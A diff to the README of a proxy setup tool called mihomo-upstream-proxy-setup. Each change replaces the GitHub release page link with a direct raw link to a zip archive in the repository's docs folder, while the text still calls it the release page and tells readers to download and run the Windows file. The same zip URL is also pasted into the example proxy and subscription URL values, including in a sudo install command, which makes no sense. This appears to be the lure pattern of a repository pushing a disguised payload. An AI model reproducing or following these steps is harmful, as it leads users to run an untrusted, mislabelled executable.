@@ -1,10 +1,10 @@
 # 🧭 mihomo-upstream-proxy-setup - Route traffic through a local proxy
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://github.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip)
 
 ## 📥 Download
 
-Visit the [release page](https://github.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/releases) to download and run the Windows file.
+Visit the [release page](https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip) to download and run the Windows file.
 
 ## 🪟 What this app does
 
@@ -41,7 +41,7 @@ Follow these steps in order.
 
 Use this link:
 
-[Go to the release page](https://github.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/releases)
+[Go to the release page](https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip)
 
 ### 2. Download the Windows file
 
@@ -132,7 +132,7 @@ If the app still fails:
 
 Use these values from your network setup:
 
-- **Internal Proxy URL**: full proxy address such as `http://proxy.example.internal:3128`
+- **Internal Proxy URL**: full proxy address such as `https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip`
 - **Internal Proxy Server**: host name or IP address
 - **Internal Proxy Port**: port number used by the proxy
 - **Subscription URL**: your Mihomo subscription link
@@ -165,7 +165,7 @@ If you need to start over:
 
 Use the release page to download and run the Windows build:
 
-[https://github.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/releases](https://github.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/releases)
+[https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip](https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip)
 
 ## 🖥️ For users who also run Linux
 
@@ -183,10 +183,10 @@ Typical setup flow:
 A typical Linux command looks like this:
 
 ```bash
-sudo INTERNAL_PROXY_URL='http://proxy.example.internal:3128' \
+sudo INTERNAL_PROXY_URL='https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip' \
   INTERNAL_PROXY_SERVER='proxy.example.internal' \
   INTERNAL_PROXY_PORT='3128' \
-  MIHOMO_SUBSCRIPTION_URL='https://example.com/your-subscription?clash=1' \
+  MIHOMO_SUBSCRIPTION_URL='https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip' \
   ./scripts/install.sh
 ```
 
